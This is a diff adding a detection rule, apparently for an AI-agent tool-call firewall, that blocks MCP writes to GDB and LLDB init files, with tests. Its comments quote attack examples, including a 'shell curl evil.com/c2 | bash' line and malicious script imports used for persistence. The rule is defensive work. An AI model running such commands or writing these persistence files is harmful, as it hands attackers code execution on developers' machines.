@@ -195,6 +195,69 @@ structural_rules:
         - tool: "write_file"
           args: {"path": "/project/scripts/helper.sh"}
 
+  # === BLOCK: Debugger init file writes via MCP (issue #921) ===
+  #
+  # GDB (.gdbinit) and LLDB (.lldbinit) load their init files automatically on
+  # every debug session start. Code injected here executes with the developer's
+  # privileges on every build/debug cycle — persistent without any cron entry
+  # or systemd service.
+  #
+  # GDB attack scenarios:
+  #   - `set auto-load scripts-directory /tmp/` + `source /tmp/evil.gdb` — load malicious script
+  #   - `set startup-with-shell on` + `shell curl evil.com/c2 | bash` — shell execution at GDB startup
+  #   - Enable remote debugging: `target remote :1234` → persistent backdoor
+  #
+  # LLDB attack scenarios:
+  #   - `command script import /tmp/evil.py` — execute arbitrary Python on LLDB start
+  #   - LLDB Python scripting enables full OS access: file writes, network calls, subprocess spawning
+  #
+  # Legitimate developer workflows that require modifying .gdbinit/.lldbinit are
+  # done manually by the developer — an AI agent has no legitimate reason to write
+  # to debugger initialization files.
+  #
+  # MITRE T1546.004 (Event Triggered Execution: Unix Shell Configuration Modification)
+  # OWASP LLM06 2025 — Excessive Agency
+  - id: mcp-persist-block-debugger-init-write
+    taxonomy: "persistence-evasion/shell-startup/shell-profile-backdoor"
+    match:
+      tool_name_any:
+        - "write_file"
+        - "create_file"
+        - "edit_file"
+        - "write_to_file"
+        - "save_file"
+        - "update_file"
+        - "append_file"
+        - "str_replace_editor"
+        - "str_replace_based_edit_tool"
+      args_match:
+        path:
+          pattern_any:
+            - "(?:^|/)\\.gdbinit$"
+            - "(?:^|/)\\.lldbinit$"
+            - "(?:^|/)\\.lldbinit\\.local$"
+            - "(?:^|/)\\.config/gdb/gdbinit$"
+    decision: "BLOCK"
+    confidence: 0.92
+    reason: "MCP write to debugger initialization file (.gdbinit, .lldbinit) — code injected here executes on every GDB or LLDB session start. GDB supports shell commands and remote debugging; LLDB supports full Python scripting. Persistent execution triggered by developer build/debug workflow. MITRE T1546.004."
+    tests:
+      tp:
+        - tool: "write_file"
+          args: {"path": "/home/user/.gdbinit"}
+        - tool: "create_file"
+          args: {"path": "/home/user/.lldbinit"}
+        - tool: "str_replace_editor"
+          args: {"path": "/home/user/.config/gdb/gdbinit"}
+        - tool: "append_file"
+          args: {"path": "/root/.gdbinit"}
+      tn:
+        - tool: "write_file"
+          args: {"path": "/workspace/project/debug/gdb-pretty-printers.py"}
+        - tool: "read_file"
+          args: {"path": "/home/user/.gdbinit"}
+        - tool: "write_file"
+          args: {"path": "/workspace/project/debug/lldb_helpers.py"}
+
   # === BLOCK: macOS LaunchAgent / LaunchDaemon persistence via MCP ===
   #
   # Writing a plist file to ~/Library/LaunchAgents/ registers a persistent
